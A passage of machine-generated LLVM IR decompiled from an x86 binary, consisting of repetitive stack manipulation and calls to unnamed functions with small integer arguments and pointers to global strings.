  %v1_80487c8 = inttoptr i32 %v0_80487c8 to i32*
  %v2_80487c8 = load i32, i32* %v1_80487c8, align 4
  store i32 %v2_80487c8, i32* %edx.global-to-local, align 4
  %v3_80487c8 = add i32 %v0_80487c8, 4
  %v1_80487c9 = inttoptr i32 %v3_80487c8 to i32*
  %v2_80487c9 = load i32, i32* %v1_80487c9, align 4
  store i32 %v2_80487c9, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_805546f.8 to i32), i32* %v1_80487c9, align 4
  %v1_80487cf = add i32 %v0_80487c8, 10388
  store i32 %v1_80487cf, i32* %edx.global-to-local, align 4
  %v2_80487d6 = add i32 %v1_80487cf, %v2_80487c3
  store i32 %v2_80487d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80487d6, i32* %v1_80487c8, align 4
  %v3_80487da = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487da, i32* %eax.global-to-local, align 4
  %v0_80487df = load i32, i32* @esp, align 4
  %v1_80487df = inttoptr i32 %v0_80487df to i32*
  %v2_80487df = load i32, i32* %v1_80487df, align 4
  store i32 %v2_80487df, i32* @ebx, align 4
  %v1_80487e0 = add i32 %v0_80487df, 10388
  store i32 %v1_80487e0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487e0, i32* %v1_80487df, align 4
  %v2_80487e8 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_80487e8, i32* %eax.global-to-local, align 4
  %v0_80487ed = load i32, i32* @esp, align 4
  %v1_80487ed = inttoptr i32 %v0_80487ed to i32*
  %v3_80487ed = add i32 %v0_80487ed, 4
  %v0_80487ee = load i32, i32* @edi, align 4
  %v1_80487ee = add i32 %v0_80487ee, 20
  store i32 %v1_80487ee, i32* %edx.global-to-local, align 4
  %v1_80487f1 = inttoptr i32 %v3_80487ed to i32*
  %v2_80487f1 = load i32, i32* %v1_80487f1, align 4
  store i32 %v2_80487f1, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487ee, i32* %v1_80487f1, align 4
  %v1_80487f3 = add i32 %v0_80487ed, 10388
  store i32 %v1_80487f3, i32* %edx.global-to-local, align 4
  %v2_80487fa = add i32 %v1_80487f3, %v2_80487e8
  store i32 %v2_80487fa, i32* %eax.global-to-local, align 4
  store i32 %v2_80487fa, i32* %v1_80487ed, align 4
  %v3_80487fe = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487fe, i32* %eax.global-to-local, align 4
  %v0_8048803 = load i32, i32* @esp, align 4
  %v1_8048803 = inttoptr i32 %v0_8048803 to i32*
  %v2_8048803 = load i32, i32* %v1_8048803, align 4
  store i32 %v2_8048803, i32* @ebx, align 4
  %v1_8048804 = add i32 %v0_8048803, 10388
  store i32 %v1_8048804, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048804, i32* %v1_8048803, align 4
  %v2_804880c = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_804880c, i32* %eax.global-to-local, align 4
  %v0_8048811 = load i32, i32* @esp, align 4
  %v1_8048811 = inttoptr i32 %v0_8048811 to i32*
  %v2_8048811 = load i32, i32* %v1_8048811, align 4
  store i32 %v2_8048811, i32* %edx.global-to-local, align 4
  %v3_8048811 = add i32 %v0_8048811, 4
  %v1_8048812 = inttoptr i32 %v3_8048811 to i32*
  %v2_8048812 = load i32, i32* %v1_8048812, align 4
  store i32 %v2_8048812, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8055487.9 to i32), i32* %v1_8048812, align 4
  %v1_8048818 = add i32 %v0_8048811, 10388
  store i32 %v1_8048818, i32* %edx.global-to-local, align 4
  %v2_804881f = add i32 %v1_8048818, %v2_804880c
  store i32 %v2_804881f, i32* %eax.global-to-local, align 4
  store i32 %v2_804881f, i32* %v1_8048811, align 4
  %v3_8048823 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048823, i32* %eax.global-to-local, align 4
  %v0_8048828 = load i32, i32* @esp, align 4
  %v1_8048828 = inttoptr i32 %v0_8048828 to i32*
  %v2_8048828 = load i32, i32* %v1_8048828, align 4
  store i32 %v2_8048828, i32* @ebx, align 4
  %v1_8048829 = add i32 %v0_8048828, 10388
  store i32 %v1_8048829, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048829, i32* %v1_8048828, align 4
  %v2_8048831 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048831, i32* %eax.global-to-local, align 4
  %v0_8048836 = load i32, i32* @esp, align 4
  %v1_8048836 = inttoptr i32 %v0_8048836 to i32*
  %v3_8048836 = add i32 %v0_8048836, 4
  %v0_8048837 = load i32, i32* @edi, align 4
  %v1_8048837 = add i32 %v0_8048837, 789
  store i32 %v1_8048837, i32* %edx.global-to-local, align 4
  %v1_804883d = inttoptr i32 %v3_8048836 to i32*
  %v2_804883d = load i32, i32* %v1_804883d, align 4
  store i32 %v2_804883d, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048837, i32* %v1_804883d, align 4
  %v1_804883f = add i32 %v0_8048836, 10388
  store i32 %v1_804883f, i32* %edx.global-to-local, align 4
  %v2_8048846 = add i32 %v1_804883f, %v2_8048831
  store i32 %v2_8048846, i32* %eax.global-to-local, align 4
  store i32 %v2_8048846, i32* %v1_8048836, align 4
  %v3_804884a = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804884a, i32* %eax.global-to-local, align 4
  %v0_804884f = load i32, i32* @esp, align 4
  %v1_804884f = inttoptr i32 %v0_804884f to i32*
  %v2_804884f = load i32, i32* %v1_804884f, align 4
  store i32 %v2_804884f, i32* %eax.global-to-local, align 4
  %v1_8048850 = add i32 %v0_804884f, 10388
  store i32 %v1_8048850, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048850, i32* %v1_804884f, align 4
  %v2_8048858 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048858, i32* %eax.global-to-local, align 4
  %v0_804885d = load i32, i32* @esp, align 4
  %v1_804885d = inttoptr i32 %v0_804885d to i32*
  %v2_804885d = load i32, i32* %v1_804885d, align 4
  store i32 %v2_804885d, i32* %ecx.global-to-local, align 4
  %v3_804885d = add i32 %v0_804885d, 4
  %v1_804885e = inttoptr i32 %v3_804885d to i32*
  %v2_804885e = load i32, i32* %v1_804885e, align 4
  store i32 %v2_804885e, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v1_804885e, align 4
  %v1_8048864 = add i32 %v0_804885d, 10388
  store i32 %v1_8048864, i32* %edx.global-to-local, align 4
  %v2_804886b = add i32 %v1_8048864, %v2_8048858
  store i32 %v2_804886b, i32* %eax.global-to-local, align 4
  store i32 %v2_804886b, i32* %v1_804885d, align 4
  %v3_804886f = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804886f, i32* %eax.global-to-local, align 4
  %v0_8048874 = load i32, i32* @esp, align 4
  %v1_8048874 = inttoptr i32 %v0_8048874 to i32*
  store i32 32, i32* %v1_8048874, align 4
  %v2_804887b = call i32 @function_8051c90(i8 %v1_804887b)
  store i32 %v2_804887b, i32* %eax.global-to-local, align 4
  %v0_8048880 = load i32, i32* @esp, align 4
  %v1_8048880 = inttoptr i32 %v0_8048880 to i32*
  %v2_8048880 = load i32, i32* %v1_8048880, align 4
  store i32 %v2_8048880, i32* %eax.global-to-local, align 4
  %v3_8048880 = add i32 %v0_8048880, 4
  %v1_8048881 = inttoptr i32 %v3_8048880 to i32*
  %v2_8048881 = load i32, i32* %v1_8048881, align 4
  store i32 %v2_8048881, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048881, align 4
  store i32 32, i32* %v1_8048880, align 4
  %v3_8048886 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048886, i32* %eax.global-to-local, align 4
  store i32 %v3_8048886, i32* @ebx, align 4
  %v0_804888d = load i32, i32* @esp, align 4
  %v1_804888d = inttoptr i32 %v0_804888d to i32*
  %v2_804888d = load i32, i32* %v1_804888d, align 4
  store i32 %v2_804888d, i32* %eax.global-to-local, align 4
  %v1_804888e = add i32 %v0_804888d, 10388
  store i32 %v1_804888e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804888e, i32* %v1_804888d, align 4
  %v2_8048896 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048896, i32* %eax.global-to-local, align 4
  %v0_804889b = load i32, i32* @esp, align 4
  %v1_804889b = inttoptr i32 %v0_804889b to i32*
  %v2_804889b = load i32, i32* %v1_804889b, align 4
  store i32 %v2_804889b, i32* %edx.global-to-local, align 4
  %v3_804889b = add i32 %v0_804889b, 4
  %v1_804889c = inttoptr i32 %v3_804889b to i32*
  %v2_804889c = load i32, i32* %v1_804889c, align 4
  store i32 %v2_804889c, i32* %ecx.global-to-local, align 4
  %v0_804889d = load i32, i32* @ebx, align 4
  store i32 %v0_804889d, i32* %v1_804889c, align 4
  %v1_804889e = add i32 %v0_804889b, 10388
  store i32 %v1_804889e, i32* %edx.global-to-local, align 4
  %v2_80488a5 = add i32 %v1_804889e, %v2_8048896
  store i32 %v2_80488a5, i32* %eax.global-to-local, align 4
  store i32 %v2_80488a5, i32* %v1_804889b, align 4
  %v3_80488a9 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488a9, i32* %eax.global-to-local, align 4
  %v0_80488ae = load i32, i32* @esp, align 4
  %v1_80488ae = inttoptr i32 %v0_80488ae to i32*
  store i32 32, i32* %v1_80488ae, align 4
  %v2_80488b5 = call i32 @function_8051c10(i8 %v1_804887b)
  store i32 %v2_80488b5, i32* %eax.global-to-local, align 4
  %v0_80488ba = load i32, i32* @esp, align 4
  %v1_80488ba = inttoptr i32 %v0_80488ba to i32*
  %v2_80488ba = load i32, i32* %v1_80488ba, align 4
  store i32 %v2_80488ba, i32* %eax.global-to-local, align 4
  %v1_80488bb = add i32 %v0_80488ba, 10388
  store i32 %v1_80488bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488bb, i32* %v1_80488ba, align 4
  %v2_80488c3 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_80488c3, i32* %eax.global-to-local, align 4
  %v0_80488c8 = load i32, i32* @esp, align 4
  %v1_80488c8 = inttoptr i32 %v0_80488c8 to i32*
  %v2_80488c8 = load i32, i32* %v1_80488c8, align 4
  store i32 %v2_80488c8, i32* %ecx.global-to-local, align 4
  %v3_80488c8 = add i32 %v0_80488c8, 4
  %v1_80488c9 = inttoptr i32 %v3_80488c8 to i32*
  %v2_80488c9 = load i32, i32* %v1_80488c9, align 4
  store i32 %v2_80488c9, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v1_80488c9, align 4
  %v1_80488cf = add i32 %v0_80488c8, 10388
  store i32 %v1_80488cf, i32* %edx.global-to-local, align 4
  %v2_80488d6 = add i32 %v1_80488cf, %v2_80488c3
  store i32 %v2_80488d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80488d6, i32* %v1_80488c8, align 4
  %v3_80488da = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488da, i32* %eax.global-to-local, align 4
  %v0_80488df = load i32, i32* @esp, align 4
  %v1_80488df = inttoptr i32 %v0_80488df to i32*
  store i32 33, i32* %v1_80488df, align 4
  %v2_80488e6 = call i32 @function_8051c90(i8 %v1_804887b)
  store i32 %v2_80488e6, i32* %eax.global-to-local, align 4
  %v0_80488eb = load i32, i32* @esp, align 4
  %v1_80488eb = inttoptr i32 %v0_80488eb to i32*
  %v2_80488eb = load i32, i32* %v1_80488eb, align 4
  store i32 %v2_80488eb, i32* %eax.global-to-local, align 4
  %v3_80488eb = add i32 %v0_80488eb, 4
  %v1_80488ec = inttoptr i32 %v3_80488eb to i32*
  %v2_80488ec = load i32, i32* %v1_80488ec, align 4
  store i32 %v2_80488ec, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80488ec, align 4
  store i32 33, i32* %v1_80488eb, align 4
  %v3_80488f1 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80488f1, i32* %eax.global-to-local, align 4
  store i32 %v3_80488f1, i32* @ebx, align 4
  %v0_80488f8 = load i32, i32* @esp, align 4
  %v1_80488f8 = inttoptr i32 %v0_80488f8 to i32*
  %v2_80488f8 = load i32, i32* %v1_80488f8, align 4
  store i32 %v2_80488f8, i32* %eax.global-to-local, align 4
  %v1_80488f9 = add i32 %v0_80488f8, 10388
  store i32 %v1_80488f9, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488f9, i32* %v1_80488f8, align 4
  %v2_8048901 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048901, i32* %eax.global-to-local, align 4
  %v0_8048906 = load i32, i32* @esp, align 4
  %v1_8048906 = inttoptr i32 %v0_8048906 to i32*
  %v2_8048906 = load i32, i32* %v1_8048906, align 4
  store i32 %v2_8048906, i32* %edx.global-to-local, align 4
  %v3_8048906 = add i32 %v0_8048906, 4
  %v1_8048907 = inttoptr i32 %v3_8048906 to i32*
  %v2_8048907 = load i32, i32* %v1_8048907, align 4
  store i32 %v2_8048907, i32* %ecx.global-to-local, align 4
  %v0_8048908 = load i32, i32* @ebx, align 4
  store i32 %v0_8048908, i32* %v1_8048907, align 4
  %v1_8048909 = add i32 %v0_8048906, 10388
  store i32 %v1_8048909, i32* %edx.global-to-local, align 4
  %v2_8048910 = add i32 %v1_8048909, %v2_8048901
  store i32 %v2_8048910, i32* %eax.global-to-local, align 4
  store i32 %v2_8048910, i32* %v1_8048906, align 4
  %v3_8048914 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048914, i32* %eax.global-to-local, align 4
  %v0_8048919 = load i32, i32* @esp, align 4
  %v1_8048919 = inttoptr i32 %v0_8048919 to i32*
  store i32 33, i32* %v1_8048919, align 4
  %v2_8048920 = call i32 @function_8051c10(i8 %v1_804887b)
  store i32 %v2_8048920, i32* %eax.global-to-local, align 4
  %v0_8048925 = load i32, i32* @esp, align 4
  %v1_8048925 = inttoptr i32 %v0_8048925 to i32*
  %v2_8048925 = load i32, i32* %v1_8048925, align 4
  store i32 %v2_8048925, i32* %eax.global-to-local, align 4
  %v1_8048926 = add i32 %v0_8048925, 10388
  store i32 %v1_8048926, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048926, i32* %v1_8048925, align 4
  %v2_804892e = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_804892e, i32* %eax.global-to-local, align 4
  %v0_8048933 = load i32, i32* @esp, align 4
  %v1_8048933 = inttoptr i32 %v0_8048933 to i32*
  %v2_8048933 = load i32, i32* %v1_8048933, align 4
  store i32 %v2_8048933, i32* %ecx.global-to-local, align 4
  %v3_8048933 = add i32 %v0_8048933, 4
  %v1_8048934 = inttoptr i32 %v3_8048933 to i32*
  %v2_8048934 = load i32, i32* %v1_8048934, align 4
  store i32 %v2_8048934, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v1_8048934, align 4
  %v1_804893a = add i32 %v0_8048933, 10388
  store i32 %v1_804893a, i32* %edx.global-to-local, align 4
  %v2_8048941 = add i32 %v1_804893a, %v2_804892e
  store i32 %v2_8048941, i32* %eax.global-to-local, align 4
  store i32 %v2_8048941, i32* %v1_8048933, align 4
  %v3_8048945 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048945, i32* %eax.global-to-local, align 4
  %v0_804894a = load i32, i32* @esp, align 4
  %v1_804894a = inttoptr i32 %v0_804894a to i32*
  store i32 34, i32* %v1_804894a, align 4
  %v2_8048951 = call i32 @function_8051c90(i8 %v1_804887b)
  store i32 %v2_8048951, i32* %eax.global-to-local, align 4
  %v0_8048956 = load i32, i32* @esp, align 4
  %v1_8048956 = inttoptr i32 %v0_8048956 to i32*
  %v2_8048956 = load i32, i32* %v1_8048956, align 4
  store i32 %v2_8048956, i32* %eax.global-to-local, align 4
  %v3_8048956 = add i32 %v0_8048956, 4
  %v1_8048957 = inttoptr i32 %v3_8048956 to i32*
  %v2_8048957 = load i32, i32* %v1_8048957, align 4
  store i32 %v2_8048957, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048957, align 4
  store i32 34, i32* %v1_8048956, align 4
  %v3_804895c = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804895c, i32* %eax.global-to-local, align 4
  store i32 %v3_804895c, i32* @ebx, align 4
  %v0_8048963 = load i32, i32* @esp, align 4
  %v1_8048963 = inttoptr i32 %v0_8048963 to i32*
  %v2_8048963 = load i32, i32* %v1_8048963, align 4
  store i32 %v2_8048963, i32* %eax.global-to-local, align 4
  %v1_8048964 = add i32 %v0_8048963, 10388
  store i32 %v1_8048964, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048964, i32* %v1_8048963, align 4
  %v2_804896c = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_804896c, i32* %eax.global-to-local, align 4
  %v0_8048971 = load i32, i32* @esp, align 4
  %v1_8048971 = inttoptr i32 %v0_8048971 to i32*
  %v2_8048971 = load i32, i32* %v1_8048971, align 4
  store i32 %v2_8048971, i32* %edx.global-to-local, align 4
  %v3_8048971 = add i32 %v0_8048971, 4
  %v1_8048972 = inttoptr i32 %v3_8048971 to i32*
  %v2_8048972 = load i32, i32* %v1_8048972, align 4
  store i32 %v2_8048972, i32* %ecx.global-to-local, align 4
  %v0_8048973 = load i32, i32* @ebx, align 4
  store i32 %v0_8048973, i32* %v1_8048972, align 4
  %v1_8048974 = add i32 %v0_8048971, 10388
  store i32 %v1_8048974, i32* %edx.global-to-local, align 4
  %v2_804897b = add i32 %v1_8048974, %v2_804896c
  store i32 %v2_804897b, i32* %eax.global-to-local, align 4
  store i32 %v2_804897b, i32* %v1_8048971, align 4
  %v3_804897f = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804897f, i32* %eax.global-to-local, align 4
  %v0_8048984 = load i32, i32* @esp, align 4
  %v1_8048984 = inttoptr i32 %v0_8048984 to i32*
  store i32 34, i32* %v1_8048984, align 4
  %v2_804898b = call i32 @function_8051c10(i8 %v1_804887b)
  store i32 %v2_804898b, i32* %eax.global-to-local, align 4
  %v0_8048990 = load i32, i32* @esp, align 4
  %v1_8048990 = inttoptr i32 %v0_8048990 to i32*
  %v1_8048991 = add i32 %v0_8048990, 10388
  store i32 %v1_8048991, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048991, i32* %v1_8048990, align 4
  %v2_8048999 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048999, i32* %eax.global-to-local, align 4
  %v0_804899e = load i32, i32* @esp, align 4
  %v1_804899e = inttoptr i32 %v0_804899e to i32*
  %v2_804899e = load i32, i32* %v1_804899e, align 4
  store i32 %v2_804899e, i32* @ebx, align 4
  %v3_804899e = add i32 %v0_804899e, 4
  %v1_804899f = inttoptr i32 %v3_804899e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v1_804899f, align 4
  %v1_80489a5 = add i32 %v0_804899e, 10388
  store i32 %v1_80489a5, i32* %edx.global-to-local, align 4
  %v2_80489ac = add i32 %v1_80489a5, %v2_8048999
  store i32 %v2_80489ac, i32* %eax.global-to-local, align 4
  store i32 %v2_80489ac, i32* %v1_804899e, align 4
  %v3_80489b0 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489b0, i32* %eax.global-to-local, align 4
  %v0_80489b5 = load i32, i32* @esp, align 4
  %v1_80489b5 = add i32 %v0_80489b5, 16
  %v1_80489b8 = add i32 %v0_80489b5, 68
  %v2_80489b8 = inttoptr i32 %v1_80489b8 to i32*
  %v3_80489b8 = load i32, i32* %v2_80489b8, align 4
  store i32 %v3_80489b8, i32* %ecx.global-to-local, align 4
  %v1_80489bc = icmp eq i32 %v3_80489b8, 0
  store i1 %v1_80489bc, i1* %zf.global-to-local, align 1
  br i1 %v1_80489bc, label %dec_label_pc_8048ad8, label %dec_label_pc_80489c4

dec_label_pc_80489c4:                             ; preds = %dec_label_pc_8048700
  %v9_80489c4 = icmp eq i32 %v0_80489b5, -4
  store i1 %v9_80489c4, i1* %zf.global-to-local, align 1
  %v2_80489c7 = inttoptr i32 %v0_80489b5 to i32*
  store i32 35, i32* %v2_80489c7, align 4
  %v2_80489c9 = call i32 @function_8051c90(i8 %v1_804887b)
  store i32 %v2_80489c9, i32* %eax.global-to-local, align 4
  %v0_80489ce = load i32, i32* @esp, align 4
  %v1_80489ce = inttoptr i32 %v0_80489ce to i32*
  %v2_80489ce = load i32, i32* %v1_80489ce, align 4
  store i32 %v2_80489ce, i32* %eax.global-to-local, align 4
  %v3_80489ce = add i32 %v0_80489ce, 4
  %v1_80489cf = inttoptr i32 %v3_80489ce to i32*
  %v2_80489cf = load i32, i32* %v1_80489cf, align 4
  store i32 %v2_80489cf, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80489cf, align 4
  store i32 35, i32* %v1_80489ce, align 4
  %v3_80489d4 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80489d4, i32* %eax.global-to-local, align 4
  store i32 %v3_80489d4, i32* @ebx, align 4
  %v0_80489db = load i32, i32* @esp, align 4
  %v1_80489db = inttoptr i32 %v0_80489db to i32*
  %v2_80489db = load i32, i32* %v1_80489db, align 4
  store i32 %v2_80489db, i32* %eax.global-to-local, align 4
  %v1_80489dc = add i32 %v0_80489db, 10388
  store i32 %v1_80489dc, i32* %ecx.global-to-local, align 4
  store i32 %v1_80489dc, i32* %v1_80489db, align 4
  %v2_80489e4 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_80489e4, i32* %eax.global-to-local, align 4
  %v0_80489e9 = load i32, i32* @esp, align 4
  %v1_80489e9 = inttoptr i32 %v0_80489e9 to i32*
  %v2_80489e9 = load i32, i32* %v1_80489e9, align 4
  store i32 %v2_80489e9, i32* %edx.global-to-local, align 4
  %v3_80489e9 = add i32 %v0_80489e9, 4
  %v1_80489ea = inttoptr i32 %v3_80489e9 to i32*
  %v2_80489ea = load i32, i32* %v1_80489ea, align 4
  store i32 %v2_80489ea, i32* %ecx.global-to-local, align 4
  %v0_80489eb = load i32, i32* @ebx, align 4
  store i32 %v0_80489eb, i32* %v1_80489ea, align 4
  %v1_80489ec = add i32 %v0_80489e9, 10388
  store i32 %v1_80489ec, i32* %edx.global-to-local, align 4
  %v2_80489f3 = add i32 %v1_80489ec, %v2_80489e4
  store i32 %v2_80489f3, i32* %eax.global-to-local, align 4
  store i32 %v2_80489f3, i32* %v1_80489e9, align 4
  %v3_80489f7 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489f7, i32* %eax.global-to-local, align 4
  %v0_80489fc = load i32, i32* @esp, align 4
  %v1_80489fc = inttoptr i32 %v0_80489fc to i32*
  store i32 35, i32* %v1_80489fc, align 4
  %v2_8048a03 = call i32 @function_8051c10(i8 %v1_804887b)
  store i32 %v2_8048a03, i32* %eax.global-to-local, align 4
  %v0_8048a08 = load i32, i32* @esp, align 4
  %v1_8048a08 = inttoptr i32 %v0_8048a08 to i32*
  %v2_8048a08 = load i32, i32* %v1_8048a08, align 4
  store i32 %v2_8048a08, i32* %eax.global-to-local, align 4
  %v1_8048a09 = add i32 %v0_8048a08, 10388
  store i32 %v1_8048a09, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a09, i32* %v1_8048a08, align 4
  %v2_8048a11 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048a11, i32* %eax.global-to-local, align 4
  %v0_8048a16 = load i32, i32* @esp, align 4
  %v1_8048a16 = inttoptr i32 %v0_8048a16 to i32*
  %v2_8048a16 = load i32, i32* %v1_8048a16, align 4
  store i32 %v2_8048a16, i32* %ecx.global-to-local, align 4
  %v3_8048a16 = add i32 %v0_8048a16, 4
  %v1_8048a17 = inttoptr i32 %v3_8048a16 to i32*
  %v2_8048a17 = load i32, i32* %v1_8048a17, align 4
  store i32 %v2_8048a17, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v1_8048a17, align 4
  %v1_8048a1d = add i32 %v0_8048a16, 10388
  store i32 %v1_8048a1d, i32* %edx.global-to-local, align 4
  %v2_8048a24 = add i32 %v1_8048a1d, %v2_8048a11
  store i32 %v2_8048a24, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a24, i32* %v1_8048a16, align 4
  %v3_8048a28 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a28, i32* %eax.global-to-local, align 4
  %v0_8048a2d = load i32, i32* @esp, align 4
  %v1_8048a2d = inttoptr i32 %v0_8048a2d to i32*
  %v2_8048a2d = load i32, i32* %v1_8048a2d, align 4
  store i32 %v2_8048a2d, i32* %eax.global-to-local, align 4
  %v3_8048a2d = add i32 %v0_8048a2d, 4
  %v1_8048a2e = inttoptr i32 %v3_8048a2d to i32*
  %v2_8048a2e = load i32, i32* %v1_8048a2e, align 4
  store i32 %v2_8048a2e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048a2e, align 4
  store i32 40, i32* %v1_8048a2d, align 4
  %v3_8048a33 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048a33, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a33, i32* @ebx, align 4
  %v0_8048a3a = load i32, i32* @esp, align 4
  %v1_8048a3a = inttoptr i32 %v0_8048a3a to i32*
  %v2_8048a3a = load i32, i32* %v1_8048a3a, align 4
  store i32 %v2_8048a3a, i32* %eax.global-to-local, align 4
  %v1_8048a3b = add i32 %v0_8048a3a, 10388
  store i32 %v1_8048a3b, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a3b, i32* %v1_8048a3a, align 4
  %v2_8048a43 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048a43, i32* %eax.global-to-local, align 4
  %v0_8048a48 = load i32, i32* @esp, align 4
  %v1_8048a48 = inttoptr i32 %v0_8048a48 to i32*
  %v2_8048a48 = load i32, i32* %v1_8048a48, align 4
  store i32 %v2_8048a48, i32* %edx.global-to-local, align 4
  %v3_8048a48 = add i32 %v0_8048a48, 4
  %v1_8048a49 = inttoptr i32 %v3_8048a48 to i32*
  %v2_8048a49 = load i32, i32* %v1_8048a49, align 4
  store i32 %v2_8048a49, i32* %ecx.global-to-local, align 4
  %v0_8048a4a = load i32, i32* @ebx, align 4
  store i32 %v0_8048a4a, i32* %v1_8048a49, align 4
  %v1_8048a4b = add i32 %v0_8048a48, 10388
  store i32 %v1_8048a4b, i32* %edx.global-to-local, align 4
  %v2_8048a52 = add i32 %v1_8048a4b, %v2_8048a43
  store i32 %v2_8048a52, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a52, i32* %v1_8048a48, align 4
  %v3_8048a56 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a56, i32* %eax.global-to-local, align 4
  %v0_8048a5b = load i32, i32* @esp, align 4
  %v1_8048a5b = inttoptr i32 %v0_8048a5b to i32*
  %v2_8048a5b = load i32, i32* %v1_8048a5b, align 4
  store i32 %v2_8048a5b, i32* @ebx, align 4
  %v1_8048a5c = add i32 %v0_8048a5b, 10388
  store i32 %v1_8048a5c, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a5c, i32* %v1_8048a5b, align 4
  %v2_8048a64 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048a64, i32* %eax.global-to-local, align 4
  %v0_8048a69 = load i32, i32* @esp, align 4
  %v1_8048a69 = inttoptr i32 %v0_8048a69 to i32*
  %v2_8048a69 = load i32, i32* %v1_8048a69, align 4
  store i32 %v2_8048a69, i32* %edx.global-to-local, align 4
  %v3_8048a69 = add i32 %v0_8048a69, 4
  %v1_8048a6a = inttoptr i32 %v3_8048a69 to i32*
  %v2_8048a6a = load i32, i32* %v1_8048a6a, align 4
  store i32 %v2_8048a6a, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805549f.7 to i32), i32* %v1_8048a6a, align 4
  %v1_8048a70 = add i32 %v0_8048a69, 10388
  store i32 %v1_8048a70, i32* %edx.global-to-local, align 4
  %v2_8048a77 = add i32 %v1_8048a70, %v2_8048a64
  store i32 %v2_8048a77, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a77, i32* %v1_8048a69, align 4
  %v3_8048a7b = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a7b, i32* %eax.global-to-local, align 4
  %v0_8048a80 = load i32, i32* @esp, align 4
  %v1_8048a80 = inttoptr i32 %v0_8048a80 to i32*
  %v2_8048a80 = load i32, i32* %v1_8048a80, align 4
  store i32 %v2_8048a80, i32* %eax.global-to-local, align 4
  %v1_8048a81 = add i32 %v0_8048a80, 10388
  store i32 %v1_8048a81, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a81, i32* %v1_8048a80, align 4
